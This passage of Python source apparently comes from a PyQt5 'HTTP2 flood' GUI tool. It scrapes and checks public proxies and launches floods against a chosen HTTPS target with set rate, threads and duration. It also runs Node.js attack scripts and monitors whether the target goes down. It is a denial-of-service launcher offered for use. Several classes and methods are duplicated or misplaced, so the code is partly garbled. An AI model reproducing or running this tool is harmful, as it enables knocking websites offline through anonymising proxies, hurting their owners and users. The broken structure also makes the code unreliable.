            QMessageBox.warning(self, "Warning", "Proxy file not found")
            return

        self.proxy_checker_log.clear()
        self.btn_start_checker.setEnabled(False)
        self.btn_stop_checker.setEnabled(True)

        self.proxy_checker_worker = ProxyCheckerWorker(proxy_file, threads, output_file)
        self.proxy_checker_worker.update_signal.connect(self.update_proxy_checker_log)
        self.proxy_checker_worker.finished_signal.connect(self.proxy_checker_finished)
        self.proxy_checker_worker.start()

    def stop_proxy_checker(self):
        if hasattr(self, "proxy_checker_worker") and self.proxy_checker_worker:
            self.proxy_checker_worker.stop()
        self.btn_start_checker.setEnabled(True)
        self.btn_stop_checker.setEnabled(False)

    def proxy_checker_finished(self):
        self.update_proxy_checker_log("✅ Proxy checking finished.", "green")
        self.btn_start_checker.setEnabled(True)
        self.btn_stop_checker.setEnabled(False)

    def update_proxy_checker_log(self, message, color="white"):
        color_map = {
            "red": "#FF3333", "green": "#39FF14", "yellow": "#FFFF33",
            "cyan": "#00FFFF", "white": "#FFFFFF"
        }
        html = f'<span style="color:{color_map.get(color,"#FFFFFF")};">{message}</span><br>'
        self.proxy_checker_log.insertHtml(html)
        self.proxy_checker_log.moveCursor(QTextCursor.End)
    # ==========================================================
    # Proxy Scraping Tab (GUI)
    # ==========================================================
    def setup_proxy_scraping_tab(self):
        scraping_layout = QVBoxLayout(self.proxy_scraping_tab)

        group = QGroupBox("🌐 Proxy Scraping")
        grid = QGridLayout()

        lbl_mode = QLabel("🔗 Mode")
        lbl_mode.setFont(QFont("Arial", 11, QFont.Bold))
        grid.addWidget(lbl_mode, 0, 0)
        self.scraping_mode = QComboBox()
        self.scraping_mode.addItems(["Raw Link", "Auto Scrape"])
        grid.addWidget(self.scraping_mode, 0, 1, 1, 2)

        lbl_link = QLabel("🌍 Input Link")
        lbl_link.setFont(QFont("Arial", 11, QFont.Bold))
        grid.addWidget(lbl_link, 1, 0)
        self.scraping_link_input = QLineEdit("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/http.txt")
        grid.addWidget(self.scraping_link_input, 1, 1, 1, 2)

        lbl_output = QLabel("💾 Output File")
        lbl_output.setFont(QFont("Arial", 11, QFont.Bold))
        grid.addWidget(lbl_output, 2, 0)
        self.scraping_output_input = QLineEdit("inputfile.txt")
        grid.addWidget(self.scraping_output_input, 2, 1, 1, 2)

        group.setLayout(grid)
        scraping_layout.addWidget(group)

        btn_layout = QHBoxLayout()
        self.btn_start_scraping = QPushButton("▶️ Start Scraping")
        self.btn_start_scraping.clicked.connect(self.start_proxy_scraping)
        btn_layout.addWidget(self.btn_start_scraping)

        self.btn_stop_scraping = QPushButton("⏹️ Stop")
        self.btn_stop_scraping.setEnabled(False)
        self.btn_stop_scraping.clicked.connect(self.stop_proxy_scraping)
        btn_layout.addWidget(self.btn_stop_scraping)

        scraping_layout.addLayout(btn_layout)

        self.proxy_scraping_log = QTextEdit()
        self.proxy_scraping_log.setReadOnly(True)
        self.proxy_scraping_log.setStyleSheet(
            "background-color:#0d0d0d; color:white; font-family:Consolas; font-size:11px;"
        )
        scraping_layout.addWidget(self.proxy_scraping_log)

    # ==========================================================
    # Proxy Scraping Handlers (GUI)
    # ==========================================================
    def start_proxy_scraping(self):
        mode = self.scraping_mode.currentText()
        link = self.scraping_link_input.text()
        output_file = self.scraping_output_input.text()
        if mode == "Auto Scrape":
            link = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/http.txt"

        self.proxy_scraping_log.clear()
        self.btn_start_scraping.setEnabled(False)
        self.btn_stop_scraping.setEnabled(True)

        self.scraper_worker = ProxyScraperWorker(link, output_file)
        self.scraper_worker.update_signal.connect(self.update_proxy_scraping_log)
        self.scraper_worker.finished_signal.connect(self.proxy_scraping_finished)
        self.scraper_worker.start()

    def stop_proxy_scraping(self):
        if hasattr(self, "scraper_worker") and self.scraper_worker:
            self.scraper_worker.stop()
        self.btn_start_scraping.setEnabled(True)
        self.btn_stop_scraping.setEnabled(False)

    def proxy_scraping_finished(self):
        self.update_proxy_scraping_log("✅ Proxy scraping finished.", "green")
        self.btn_start_scraping.setEnabled(True)
        self.btn_stop_scraping.setEnabled(False)

    def update_proxy_scraping_log(self, message, color="white"):
        color_map = {
            "red": "#FF3333", "green": "#39FF14", "yellow": "#FFFF33",
            "cyan": "#00FFFF", "white": "#FFFFFF"
        }
        html = f'<span style="color:{color_map.get(color,"#FFFFFF")};">{message}</span><br>'
        self.proxy_scraping_log.insertHtml(html)
        self.proxy_scraping_log.moveCursor(QTextCursor.End)

# ==========================================================
# Proxy Checker Worker
# ==========================================================
class ProxyCheckerWorker(QThread):
    update_signal = pyqtSignal(str, str)  # message, color
    finished_signal = pyqtSignal()

    def __init__(self, proxy_file, threads=50, output_file="inputfile.txt"):
        super().__init__()
        self.proxy_file = proxy_file
        self.threads = threads
        self.output_file = output_file
        self.is_running = True

    def run(self):
        try:
            with open(self.proxy_file, "r", encoding="utf-8", errors="ignore") as f:
                proxies = [line.strip() for line in f if line.strip()]
        except Exception as e:
            self.update_signal.emit(f"Error loading proxy file: {str(e)}", "red")
            self.finished_signal.emit()
            return

        if not proxies:
            self.update_signal.emit("No proxies found!", "red")
            self.finished_signal.emit()
            return

        self.update_signal.emit(f"Loaded {len(proxies)} proxies", "green")
        active_proxies = []

        def check_proxy(proxy):
            if not self.is_running:
                return
            try:
                r = requests.get(
                    "http://httpbin.org/ip",
                    proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"},
                    timeout=5
                )
                if r.status_code == 200:
                    active_proxies.append(proxy)
                    self.update_signal.emit(f"[ACTIVE] {proxy}", "green")
                else:
                    self.update_signal.emit(f"[BAD] {proxy}", "red")
            except Exception:
                self.update_signal.emit(f"[BAD] {proxy}", "red")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_proxy, proxies)

        try:
            with open(self.output_file, "w") as f:
                f.write("\n".join(active_proxies))
            self.update_signal.emit(
                f"Saved {len(active_proxies)} active proxies → {self.output_file}", "cyan"
            )
        except Exception as e:
            self.update_signal.emit(f"Error saving proxies: {str(e)}", "red")

        self.finished_signal.emit()

    def stop(self):
        self.is_running = False
    # ==========================================================
    # Proxy Checker Handlers
    # ==========================================================
    def browse_proxy_file_checker(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Proxy File", "", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            self.checker_proxy_input.setText(file_path)

    def start_proxy_checker(self):
        proxy_file = self.checker_proxy_input.text()
        output_file = self.checker_output_input.text()
        threads = self.checker_threads_input.value()

        if not os.path.exists(proxy_file):
            QMessageBox.warning(self, "Warning", "Proxy file not found")
            return

        self.proxy_checker_log.clear()
        self.btn_start_checker.setEnabled(False)
        self.btn_stop_checker.setEnabled(True)

        self.proxy_checker_worker = ProxyCheckerWorker(proxy_file, threads, output_file)
        self.proxy_checker_worker.update_signal.connect(self.update_proxy_checker_log)
        self.proxy_checker_worker.finished_signal.connect(self.proxy_checker_finished)
        self.proxy_checker_worker.start()

    def stop_proxy_checker(self):
        if hasattr(self, "proxy_checker_worker") and self.proxy_checker_worker:
            self.proxy_checker_worker.stop()
        self.btn_start_checker.setEnabled(True)
        self.btn_stop_checker.setEnabled(False)

    def proxy_checker_finished(self):
        self.update_proxy_checker_log("✅ Proxy checking finished.", "green")
        self.btn_start_checker.setEnabled(True)
        self.btn_stop_checker.setEnabled(False)

    def update_proxy_checker_log(self, message, color="white"):
        color_map = {
            "red": "#FF3333",
            "green": "#39FF14",
            "yellow": "#FFFF33",
            "cyan": "#00FFFF",
            "white": "#FFFFFF"
        }
        html = f'<span style="color:{color_map.get(color,"#FFFFFF")};">{message}</span><br>'
        self.proxy_checker_log.insertHtml(html)
        self.proxy_checker_log.moveCursor(QTextCursor.End)


    # ==========================================================
    # Setup Proxy Scraping Tab
    # ==========================================================
    def setup_proxy_scraping_tab(self):
        scraping_layout = QVBoxLayout(self.proxy_scraping_tab)

        group = QGroupBox("🌐 Proxy Scraping")
        grid = QGridLayout()

        # Input mode (raw link or auto scrape)
        lbl_mode = QLabel("🔗 Mode")
        lbl_mode.setFont(QFont("Arial", 11, QFont.Bold))
        grid.addWidget(lbl_mode, 0, 0)
        self.scraping_mode = QComboBox()
        self.scraping_mode.addItems(["Raw Link", "Auto Scrape"])
        grid.addWidget(self.scraping_mode, 0, 1, 1, 2)

        # Input link
        lbl_link = QLabel("🌍 Input Link")
        lbl_link.setFont(QFont("Arial", 11, QFont.Bold))
        grid.addWidget(lbl_link, 1, 0)
        self.scraping_link_input = QLineEdit("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/http.txt")
        grid.addWidget(self.scraping_link_input, 1, 1, 1, 2)

        # Output file
        lbl_output = QLabel("💾 Output File")
        lbl_output.setFont(QFont("Arial", 11, QFont.Bold))
        grid.addWidget(lbl_output, 2, 0)
        self.scraping_output_input = QLineEdit("inputfile.txt")
        grid.addWidget(self.scraping_output_input, 2, 1, 1, 2)

        group.setLayout(grid)
        scraping_layout.addWidget(group)

        # Buttons
        btn_layout = QHBoxLayout()
        self.btn_start_scraping = QPushButton("▶️ Start Scraping")
        self.btn_start_scraping.clicked.connect(self.start_proxy_scraping)
        btn_layout.addWidget(self.btn_start_scraping)

        self.btn_stop_scraping = QPushButton("⏹️ Stop")
        self.btn_stop_scraping.setEnabled(False)
        self.btn_stop_scraping.clicked.connect(self.stop_proxy_scraping)
        btn_layout.addWidget(self.btn_stop_scraping)

        scraping_layout.addLayout(btn_layout)

        # Log console
        self.proxy_scraping_log = QTextEdit()
        self.proxy_scraping_log.setReadOnly(True)
        self.proxy_scraping_log.setStyleSheet(
            "background-color:#0d0d0d; color:white; font-family:Consolas; font-size:11px;"
        )
        scraping_layout.addWidget(self.proxy_scraping_log)


# ==========================================================
# Proxy Scraper Worker
# ==========================================================
class ProxyScraperWorker(QThread):
    update_signal = pyqtSignal(str, str)
    finished_signal = pyqtSignal()

    def __init__(self, link, output_file="inputfile.txt"):
        super().__init__()
        self.link = link
        self.output_file = output_file
        self.is_running = True

    def run(self):
        try:
            r = requests.get(self.link, timeout=10)
            if r.status_code == 200:
                proxies = r.text.strip().splitlines()
                with open(self.output_file, "w") as f:
                    f.write("\n".join(proxies))
                self.update_signal.emit(f"Saved {len(proxies)} proxies → {self.output_file}", "cyan")
            else:
                self.update_signal.emit(f"Error fetching proxies: {r.status_code}", "red")
        except Exception as e:
            self.update_signal.emit(f"Scraping error: {str(e)}", "red")

        self.finished_signal.emit()

    def stop(self):
        self.is_running = False
    # ==========================================================
    # Proxy Scraping Handlers
    # ==========================================================
    def start_proxy_scraping(self):
        mode = self.scraping_mode.currentText()
        link = self.scraping_link_input.text()
        output_file = self.scraping_output_input.text()

        if mode == "Auto Scrape":
            link = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/http.txt"

        self.proxy_scraping_log.clear()
        self.btn_start_scraping.setEnabled(False)
        self.btn_stop_scraping.setEnabled(True)

        self.scraper_worker = ProxyScraperWorker(link, output_file)
        self.scraper_worker.update_signal.connect(self.update_proxy_scraping_log)
        self.scraper_worker.finished_signal.connect(self.proxy_scraping_finished)
        self.scraper_worker.start()

    def stop_proxy_scraping(self):
        if hasattr(self, "scraper_worker") and self.scraper_worker:
            self.scraper_worker.stop()
        self.btn_start_scraping.setEnabled(True)
        self.btn_stop_scraping.setEnabled(False)

    def proxy_scraping_finished(self):
        self.update_proxy_scraping_log("✅ Proxy scraping finished.", "green")
        self.btn_start_scraping.setEnabled(True)
        self.btn_stop_scraping.setEnabled(False)

    def update_proxy_scraping_log(self, message, color="white"):
        color_map = {
            "red": "#FF3333",
            "green": "#39FF14",
            "yellow": "#FFFF33",
            "cyan": "#00FFFF",
            "white": "#FFFFFF"
        }
        html = f'<span style="color:{color_map.get(color,"#FFFFFF")};">{message}</span><br>'
        self.proxy_scraping_log.insertHtml(html)
        self.proxy_scraping_log.moveCursor(QTextCursor.End)


    # ==========================================================
    # File Browsers
    # ==========================================================
    def browse_proxy_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Proxy File", "", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            self.proxy_input.setText(file_path)

    def browse_js_proxy_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Proxy File", "", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            self.js_proxy_input.setText(file_path)

    def load_js_files(self):
        self.js_file_combo.clear()
        for f in os.listdir("."):
            if f.endswith(".js"):
                self.js_file_combo.addItem(f)


    # ==========================================================
    # Attack Handlers
    # ==========================================================
    def start_attack(self):
        target = self.target_input.text()
        duration = self.duration_input.value()
        rate = self.rate_input.value()
        threads = self.threads_input.value()
        proxy_file = self.proxy_input.text()

        if not target.startswith("https://"):
            QMessageBox.warning(self, "Warning", "Target URL must start with https://")
            return

        if not os.path.exists(proxy_file):
            QMessageBox.warning(self, "Warning", "Proxy file does not exist")
            return

        # Reset stats
        self.stats = {
            "requests_sent": 0,
            "successful_responses": 0,
            "failed_responses": 0,
            "errors": 0,
            "start_time": time.time()
        }
        self.update_stats_display()

        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.status_bar.setText("⚡ Attack in progress...")
        self.status_bar.setStyleSheet("color:orange; padding:5px; background-color:#1a1a1a;")

        self.worker = HTTP2FloodWorker(target, duration, rate, threads, proxy_file)
        self.worker.update_signal.connect(self.update_log)
        self.worker.stats_signal.connect(self.update_stats)
        self.worker.update_signal.emit("Loaded proxies", "green")   # string, bukan QTextCursor
        self.worker.finished_signal.connect(self.on_attack_finished)
        self.worker.start()

        # Monitor target
        self.monitor = TargetMonitor(target)
        self.monitor.status_signal.connect(self.update_target_status)
        self.monitor.start()

        # Progress bar countdown
        self.progress_bar.setValue(0)
        self.progress_timer = QTimer()
        self.progress_timer.timeout.connect(lambda: self.update_progress(duration))
        self.progress_timer.start(1000)

    def stop_attack(self):
        if self.worker:
            self.worker.stop()
            self.worker.quit()
            self.worker.wait(2000)
            self.worker.deleteLater()
            self.worker = None

        if self.monitor:
            self.monitor.stop()
            self.monitor.quit()
            self.monitor.wait(2000)
            self.monitor.deleteLater()
            self.monitor = None

        if hasattr(self, "progress_timer"):
            self.progress_timer.stop()

        self.on_attack_finished()
        self.update_log("⏹️ Attack stopped.", "red")

    def on_attack_finished(self):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)

        if hasattr(self, "progress_timer"):
            self.progress_timer.stop()

        if self.monitor:
            self.monitor.stop()
            self.monitor.quit()
            self.monitor.wait(2000)
            self.monitor.deleteLater()
            self.monitor = None

        self.update_log("✅ Attack finished.", "green")
        self.progress_bar.setValue(100)


    # ==========================================================
    # Log + Stats Update
    # ==========================================================
    def update_log(self, message, color="white"):
        color_map = {
            "red": "#FF3333",
            "green": "#39FF14",
            "yellow": "#FFFF33",
            "cyan": "#00FFFF",
            "white": "#FFFFFF"
        }
        html = f'<span style="color:{color_map.get(color,"#FFFFFF")};">{message}</span><br>'
        self.console_output.insertHtml(html)
        self.console_output.moveCursor(QTextCursor.End)

    def update_stats(self, stats):
        self.stats.update(stats)
        self.update_stats_display()

    def update_stats_display(self):
        self.requests_label.setText(str(self.stats["requests_sent"]))
        self.success_label.setText(str(self.stats["successful_responses"]))
        self.failed_label.setText(str(self.stats["failed_responses"]))
        self.errors_label.setText(str(self.stats["errors"]))

        elapsed = time.time() - self.stats["start_time"]
        if elapsed > 0:
            rps = self.stats["requests_sent"] / elapsed
            self.rps_label.setText(f"{rps:.2f}")
            self.graph_counter += 1
            self.rps_data.append(rps)
            self.rps_time.append(self.graph_counter)
            self.rps_curve.setData(self.rps_time, self.rps_data)

    def update_progress(self, duration):
        elapsed = int(time.time() - self.stats["start_time"])
        progress = min(int((elapsed / duration) * 100), 100)
        self.progress_bar.setValue(progress)

    def update_target_status(self, msg, color):
        self.target_status_label.setText(msg)
        if color == "green":
            self.target_status_label.setStyleSheet("color:#39FF14; font-weight:bold;")
        else:
            self.target_status_label.setStyleSheet("color:#FF3333; font-weight:bold;")


    # ==========================================================
    # JS Attack Handlers
    # ==========================================================
    def start_js_attack(self):
        self.js_requests_count = 0
        self.js_success_count = 0
        self.js_failed_count = 0
        self.js_error_count = 0
        self.js_start_time = time.time()
        self.update_js_stats()

        js_file = self.js_file_combo.currentText()
        target = self.js_url_input.text()
        duration = str(self.js_time_input.value())
        rate = str(self.js_rate_input.value())
        threads = str(self.js_threads_input.value())
        proxy = self.js_proxy_input.text()

        if not js_file or not os.path.exists(js_file):
            QMessageBox.warning(self, "Warning", "Please select a valid JS file")
            return

        if not os.path.exists(proxy):
            QMessageBox.warning(self, "Warning", "Proxy file not found")
            return

        self.js_start_btn.setEnabled(False)
        self.js_stop_btn.setEnabled(True)
        self.log_signal.emit(f"▶️ Running Node.js: {js_file}", "cyan")

        cmd = ["node", js_file, target, duration, rate, threads, proxy]
        self.js_process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )

        self.js_progress_bar.setValue(0)
        self.js_duration = int(duration)
        self.js_timer = QTimer()
        self.js_timer.timeout.connect(self.update_js_progress)
        self.js_timer.start(1000)

        threading.Thread(target=self.read_js_logs, daemon=True).start()

    def read_js_logs(self):
        for line in iter(self.js_process.stdout.readline, ""):
            if not line:
                break
            text = line.strip()
            self.log_signal.emit(text, "white")

            if "SUCCESS" in text:
                self.js_success_count += 1
            elif "FAIL" in text:
                self.js_failed_count += 1
            elif "ERROR" in text:
                self.js_error_count += 1

            self.js_requests_count += 1
            self.update_js_stats()

    def stop_js_attack(self):
        if hasattr(self, "js_process") and self.js_process:
            self.js_process.terminate()
            self.js_process = None
        if hasattr(self, "js_timer"):
            self.js_timer.stop()
        self.js_start_btn.setEnabled(True)
        self.js_stop_btn.setEnabled(False)
        self.update_log("⏹️ JS Attack stopped.", "red")

    def update_js_progress(self):
        elapsed = int(time.time() - self.js_start_time)
        progress = min(int((elapsed / self.js_duration) * 100), 100)
        self.js_progress_bar.setValue(progress)

    def update_js_stats(self):
        self.js_requests_label.setText(str(self.js_requests_count))
        self.js_success_label.setText(str(self.js_success_count))
        self.js_failed_label.setText(str(self.js_failed_count))
        self.js_errors_label.setText(str(self.js_error_count))

        elapsed = time.time() - self.js_start_time
        if elapsed > 0:
            rps = self.js_requests_count / elapsed
            self.js_rps_label.setText(f"{rps:.2f}")


# ==========================================================
# MAIN
# ==========================================================
if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = HTTP2FloodGUI()
    window.show()
    sys.exit(app.exec_())

